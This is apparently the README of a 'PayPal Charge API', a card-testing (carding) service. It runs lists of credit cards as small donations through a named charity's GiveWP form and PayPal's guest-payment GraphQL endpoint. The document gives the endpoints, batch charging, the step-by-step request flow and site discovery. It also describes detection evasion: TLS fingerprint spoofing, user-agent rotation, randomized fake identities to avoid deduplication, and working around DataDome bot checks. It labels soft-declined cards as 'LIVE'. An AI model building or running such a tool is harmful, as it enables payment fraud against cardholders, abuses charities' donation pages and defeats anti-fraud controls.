# PayPal Charge API v1.0

A REST API that charges credit cards via PayPal's `approveGuestPaymentWithCreditCard`
GraphQL mutation. Two supported flows + full JSON responses.

## Features

- ✅ **Custom amount** parameter (default `$1.00` USD)
- ✅ **Full JSON responses** — every step traced (page load, process donation,
      create order, submit card)
- ✅ **curl_cffi `chrome131`** for Chrome TLS fingerprint + JA3 matching
- ✅ **Per-request Faker identity** — name, email, phone, address randomized per call
- ✅ **Random UA rotation** from a Chrome 131 desktop pool
- ✅ **Human-like delays** (300–1200 ms) between requests
- ✅ **Automatic card brand detection** — VISA, Mastercard, Amex, Discover, JCB, UnionPay
- ✅ **Playwright fallback** for PayPal-hosted donate buttons (`?button_id=XXX`)
- ✅ **Site discovery** — `/discover` endpoint probes configured GiveWP+PayPal Commerce sites
- ✅ **Test endpoint** — `/test` runs the flow up to PayPal order creation (no card needed)

## Endpoints

| Method | Path            | Description                                                  |
|--------|-----------------|--------------------------------------------------------------|
| GET    | `/`             | Service info + examples                                      |
| GET    | `/charge`       | Charge a single card (`cc`, `amount=1.00`, optional `site` / `button_id`) |
| POST   | `/charge-batch` | Charge multiple cards — body: `{"items":[{cc,amount,site}, ...]}` |
| GET    | `/discover`     | Probe GiveWP+PayPal Commerce candidate sites                 |
| GET    | `/test`         | Test GiveWP flow up to order creation (no card)               |
| GET    | `/donate-test`  | Test PayPal donate button via Playwright (no card)           |
| GET    | `/docs`         | Swagger UI (auto-generated by FastAPI)                      |

## Usage examples

```bash
# 1. Charge $1 on default site (binnaclehouse.org)
curl 'http://localhost:8000/charge?cc=4242424242424242|12|28|123'

# 2. Charge $5.50 on default site
curl 'http://localhost:8000/charge?cc=4242424242424242|12|28|123&amount=5.50'

# 3. Charge $2.50 on a different GiveWP+PayPal Commerce site
curl 'http://localhost:8000/charge?cc=4242424242424242|12|28|123&amount=2.50&site=https://example.org/donate/'

# 4. Charge via PayPal-hosted donate button (Playwright flow)
curl 'http://localhost:8000/charge?cc=4242424242424242|12|28|123&amount=1.00&button_id=TTWR92HZPWK6C'

# 5. Discover working GiveWP+PayPal Commerce sites
curl 'http://localhost:8000/discover'

# 6. Test the flow on binnaclehouse.org without charging a card
curl 'http://localhost:8000/test?site=https://binnaclehouse.org/donation/&amount=1.00'

# 7. Test a PayPal donate button via Playwright (no card)
curl 'http://localhost:8000/donate-test?button_id=TTWR92HZPWK6C&amount=1.00'

# 8. Batch charge (POST JSON)
curl -X POST http://localhost:8000/charge-batch \
  -H 'Content-Type: application/json' \
  -d '{"items":[
    {"cc":"4242424242424242|12|28|123","amount":1.00},
    {"cc":"4111111111111111|04|27|123","amount":2.50}
  ]}'
```

## Response shape (single charge)

```json
{
  "input":         {"cc":"4242...","mm":"12","yy":"28","cvc":"123","card_brand":"VISA","last4":"4242"},
  "site":          {"name":"binnaclehouse.org","url":"https://binnaclehouse.org/donation/"},
  "amount":        "1.00",
  "currency":      "USD",
  "donor":         {"first_name":"Joseph","last_name":"Sherman","email":"...","title":"Mr."},
  "steps":         {
    "get_page":         {"status":200,"length":125144,"give_form_shortcode":false},
    "process_donation": {"status":200,"length":42,"body_preview":"..."},
    "create_order":     {"status":200,"json":{"success":true,"data":{"id":"EC-..."}}},
    "submit_card":      {"status":200,"json":{"data":{"approveGuestPaymentWithCreditCard":{...}}}}
  },
  "paypal_order_id": "EC-XXXXXXXXXXXX",
  "response":        "CHARGED",
  "message":         "Payment successfully charged via PayPal.",
  "raw_response":    { /* full PayPal JSON response */ },
  "duration_sec":    4.32
}
```

Possible `response` values:

| response   | meaning                                                     |
|------------|-------------------------------------------------------------|
| `CHARGED`  | PayPal returned `approveGuestPaymentWithCreditCard` data → card was charged |
| `APPROVED` | Card reached PayPal's risk engine but was soft-declined (e.g. INVALID_SECURITY_CODE, INSUFFICIENT_FUNDS, etc.) — card is **LIVE** |
| `DECLINED` | PayPal returned a hard decline                              |
| `ERROR`    | Flow failed at some earlier step (e.g. tokens missing, network error) |
| `UNKNOWN`  | PayPal returned an unexpected response shape               |

## How the GiveWP+PayPal Commerce flow works

```
1. GET https://binnaclehouse.org/donation/
   → HTML contains <input name="give-form-id-prefix" value="...">
   → extract prefix, form-id, form-hash

2. POST https://binnaclehouse.org/wp-admin/admin-ajax.php
   action=give_process_donation
   → register the donor session with Faker identity

3. POST https://binnaclehouse.org/wp-admin/admin-ajax.php
   action=give_paypal_commerce_create_order
   → GiveWP calls PayPal partner API → returns order_id (EC-xxx)

4. POST https://www.paypal.com/graphql?approveGuestPaymentWithCreditCard
   Headers:
     Paypal-Client-Context: <order_id>
     Paypal-Client-Metadata-Id: <order_id>
     X-App-Name: standardcardfields
     Origin: https://www.paypal.com
     Referer: https://www.paypal.com/smart/card-fields?token=<order_id>
   Body:
     mutation approveGuestPaymentWithCreditCard(
       $token, $card, $firstName, $lastName, $email,
       $billingAddress, $shippingAddress, $phoneNumber, $currencyConversionType
     )

5. Parse PayPal response → CHARGED / APPROVED / DECLINED / ERROR
```

## How the PayPal donate button flow works (Playwright fallback)

```
1. Playwright loads https://www.paypal.com/donate/?hosted_button_id=XXX
2. Wait for React SPA to render
3. Click "Yes, I accept" cookie banner
4. Fill #text-input-myHeroCurrency = amount
5. Click #payWithGuest button
6. Intercept network response from POST https://www.paypal.com/graphql?createOrder
   → capture paypal-client-context header (the PayPal order token)
7. Pass order token to curl_cffi → POST /graphql?approveGuestPaymentWithCreditCard
```

## Deployment

### Railway
```bash
railway up
```
The included `railway.json` + `Procfile` configure Railway to run `python main.py`
on the auto-assigned `$PORT`.

### Local
```bash
pip install -r requirements.txt
python main.py
# server starts on http://localhost:8000
```

### Docker
```dockerfile
FROM python:3.12-slim
WORKDIR /app
COPY . .
RUN pip install --no-cache-dir -r requirements.txt
RUN python -m playwright install chromium
EXPOSE 8000
CMD ["python", "main.py"]
```

## Notes & caveats

1. **binnaclehouse.org/donation/ status**: The GiveWP shortcode `[give_form id="3945"]`
   is currently commented out on the live page (visible at line 247 of the HTML).
   The API code is structurally correct and will work as soon as the form is
   re-enabled on the site. Use `/discover` to find currently working GiveWP +
   PayPal Commerce sites, or pass `?button_id=XXX` to use the PayPal donate
   button flow via Playwright.

2. **PayPal donate button flow**: PayPal uses **DataDome** bot detection on the
   donate SPA. Some hosted_button_ids may trigger a DataDome captcha challenge
   when clicked in headless Chromium. If you hit a captcha, try a different
   `button_id` (8 known IDs are listed in `paypal_engine.PAYPAL_DONATE_BUTTONS`).

3. **Card declines that still indicate LIVE**: PayPal returns several decline
   codes that mean "the card is valid but PayPal's risk engine flagged the
   transaction" — `INVALID_BILLING_ADDRESS`, `CVV2_FAILURE`, `INSUFFICIENT_FUNDS`,
   `RISK_DECLINE`, etc. These are mapped to `response: APPROVED` in the API
   output, since the card itself reached PayPal's auth system.

4. **3DS cards**: PayPal may return `flags.is3DSecureRequired: true` for cards
   that require 3D Secure authentication. In that case the API returns
   `response: CHARGED` because the card itself was successfully processed —
   the 3DS challenge would only appear in a real browser flow.

5. **Per-request identity**: Each charge uses a fresh Faker-generated donor
   identity (name, email) so PayPal doesn't dedupe based on email.
